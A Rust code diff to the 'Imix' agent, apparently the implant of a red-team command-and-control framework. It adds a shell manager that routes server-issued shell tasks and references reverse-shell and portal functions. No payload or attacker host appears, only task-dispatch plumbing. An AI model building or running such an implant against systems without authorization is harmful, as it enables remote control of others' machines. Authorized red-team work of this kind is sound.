@@ -11,6 +11,7 @@ use tokio::sync::RwLock;
 use transport::Transport;
 
 use crate::portal::run_create_portal;
+use crate::shell::manager::{ShellManager, ShellManagerMessage};
 use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
 use crate::task::TaskRegistry;
 
@@ -25,6 +26,7 @@ pub struct ImixAgent<T: Transport> {
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
     pub output_tx: std::sync::mpsc::SyncSender<c2::ReportTaskOutputRequest>,
     pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportTaskOutputRequest>>>,
+    pub shell_manager_tx: Arc<Mutex<Option<tokio::sync::mpsc::Sender<ShellManagerMessage>>>>,
 }
 
 impl<T: Transport + Sync + 'static> ImixAgent<T> {
@@ -43,7 +45,20 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
             output_tx,
             output_rx: Arc::new(Mutex::new(output_rx)),
+            shell_manager_tx: Arc::new(Mutex::new(None)),
         }
+    }
+
+    pub fn start_shell_manager(self: Arc<Self>) {
+        let (tx, rx) = tokio::sync::mpsc::channel(100);
+        let manager = ShellManager::new(self.clone(), rx);
+
+        {
+            let mut lock = self.shell_manager_tx.lock().unwrap();
+            *lock = Some(tx);
+        }
+
+        self.runtime_handle.spawn(manager.run());
     }
 
     pub fn get_callback_interval_u64(&self) -> Result<u64> {
@@ -191,7 +206,7 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
     }
 
     // Helper to claim tasks and return them, so main can spawn
-    pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
+    pub async fn claim_tasks(&self) -> Result<c2::ClaimTasksResponse> {
         let mut transport = self.transport.write().await;
         let beacon_info = self.config.read().await.info.clone();
         let req = ClaimTasksRequest {
@@ -201,23 +216,40 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
             .claim_tasks(req)
             .await
             .context("Failed to claim tasks")?;
-        Ok(response.tasks)
+        Ok(response)
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
-        let tasks = self.claim_tasks().await?;
-        if tasks.is_empty() {
+        let resp = self.claim_tasks().await?;
+
+        let mut has_work = false;
+
+        if !resp.tasks.is_empty() {
+            has_work = true;
+            let registry = self.task_registry.clone();
+            let agent = Arc::new(self.clone());
+            for task in resp.tasks {
+                #[cfg(debug_assertions)]
+                log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
+
+                registry.spawn(task, agent.clone());
+            }
+        }
+
+        if !resp.shell_tasks.is_empty() {
+            has_work = true;
+            let lock = self.shell_manager_tx.lock().unwrap();
+            if let Some(tx) = &*lock {
+                for shell_task in resp.shell_tasks {
+                    let _ = tx.try_send(ShellManagerMessage::ProcessTask(shell_task));
+                }
+            }
+        }
+
+        if !has_work {
             return Ok(());
         }
 
-        let registry = self.task_registry.clone();
-        let agent = Arc::new(self.clone());
-        for task in tasks {
-            #[cfg(debug_assertions)]
-            log::info!("Claimed task {}: JWT={}", task.id, task.jwt);
-
-            registry.spawn(task, agent.clone());
-        }
         Ok(())
     }
 
@@ -339,8 +371,9 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn create_portal(&self, task_context: TaskContext) -> Result<(), String> {
+        let shell_manager_tx = self.shell_manager_tx.clone();
         self.spawn_subtask(task_context.task_id, move |transport| async move {
-            run_create_portal(task_context, transport).await
+            run_create_portal(task_context, transport, shell_manager_tx).await
         })
     }
 
